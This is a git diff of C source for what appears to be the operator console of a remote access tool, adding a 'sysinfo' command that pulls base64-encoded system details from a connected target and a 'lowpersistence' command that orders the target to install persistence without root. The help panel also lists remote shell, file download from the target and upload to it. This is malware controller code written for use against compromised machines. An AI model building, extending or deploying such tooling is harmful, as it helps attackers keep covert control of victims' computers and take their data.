@@ -31,18 +31,47 @@
 
 // Prototipo
 char* getSystemInformation(SOCKET targetConn, char *command);
+char* decodeSystemInformation(char *codedSysInfo);
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort);
 int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort);
 int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct);
 int sndAndExecCmd(SOCKET targetConn, char *command, char *resp);
 int downloadFunc(char *command, SOCKET targetConn, char *ip); 
+int setLowPersistence(SOCKET targetConn, char *command);
 int startServer();
 void helpPannel();
 void ctrlCHandler(int sig);
 void checkStart(char *IPAddress);
 void printColor(char* text, int color);
 void StartSending(SOCKET targetConn, char *instruct);
+void StartGetSysInfo(SOCKET targetConn, char *command);
 void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort);
+
+char* getSystemInformation(SOCKET targetConn, char *command){
+    send(targetConn, command, strlen(command), 0);
+    char* recvData = malloc(SOCKBUFFER);
+
+    while (true){
+        recv(targetConn, recvData, SOCKBUFFER, 0);
+        if (strstr(recvData, "end\0") == 0)
+            break;
+        else 
+            printf("%s", recvData);
+            continue;
+    }
+    return recvData;   
+}
+
+char* decodeSystemInformation(char *codedSysInfo){
+    char* decodedSystemInfo = base64_decode(codedSysInfo);
+    return decodedSystemInfo;
+}
+
+
+void StartGetSysInfo(SOCKET targetConn, char *command){
+    char *codedSysInfo = getSystemInformation(targetConn, command);
+    printf("%s", decodeSystemInformation(codedSysInfo));
+}
 
 void ctrlCHandler(int sig) {
     // Exit ctrl + c 
@@ -85,6 +114,10 @@ void helpPannel(){
     printf("\t\t| [!>] download <file>       -> Download from target \n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
+    printf("\t\t---------------------------------------------------------\n");  
+    printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
+    printf("\t\t---------------------------------------------------------\n");  
+    printf("\t\t| [!>] lowpersistence        -> Apply no root needed persistence\n");
     printf("\t\t---------------------------------------------------------\n");  
     printf("\t\t| [!>] q / exit              -> Exit the conection\n");
     printf("\t\t---------------------------------------------------------\n");
@@ -264,33 +297,18 @@ int downloadFunc(char *command, SOCKET targetConn, char *ip) {
     return 0;
 }
 
-char* getSystemInformation(SOCKET targetConn, char *command){
+int setLowPersistence(SOCKET targetConn, char *command){
     send(targetConn, command, strlen(command), 0);
-    char* recvData = malloc(SOCKBUFFER);
+    char* recvData = malloc(SOCKBUFFER);    
 
-    while (true){
-        recv(targetConn, recvData, SOCKBUFFER, 0);
-        if (strstr(recvData, "end\0") == 0)
-            break;
-        else 
-            printf("%s", recvData);
-            continue;
-        
+    recv(targetConn, recvData, SOCKBUFFER, 0);
+    if (strcmp("error", recvData) == 0){
+        printColor("\n\n\t[!>] ", RED); printColor("Error gettin low persistence...", YELLOW);
     }
 
-    return recvData;
-    
-}
-
-char* decodeSystemInformation(char *codedSysInfo){
-    char* decodedSystemInfo = base64_decode(codedSysInfo);
-    return decodedSystemInfo;
-}
-
-void StartGetSysInfo(SOCKET targetConn, char *command){
-    char *codedSysInfo = getSystemInformation(targetConn, command);
-    printf("%s", decodeSystemInformation(codedSysInfo));
-
+    else if (strcmp("exito", recvData) == 0){
+        printColor("\n\t[!>] ", YELLOW); printColor("Low persistence setted succsessfully...\n", BLUE);
+    }
 }
 
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
@@ -346,6 +364,9 @@ int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
             } else if (strcmp(command, "sysinfo") == 0){
                 StartGetSysInfo(targetConn, command);
                 
+            } else if (strcmp(command, "lowpersistence") == 0){
+                setLowPersistence(targetConn, command);
+        
             } else {
                 printColor("\n\t[!>] ", RED); printColor("Instruct Not Known...\n", YELLOW);
             }
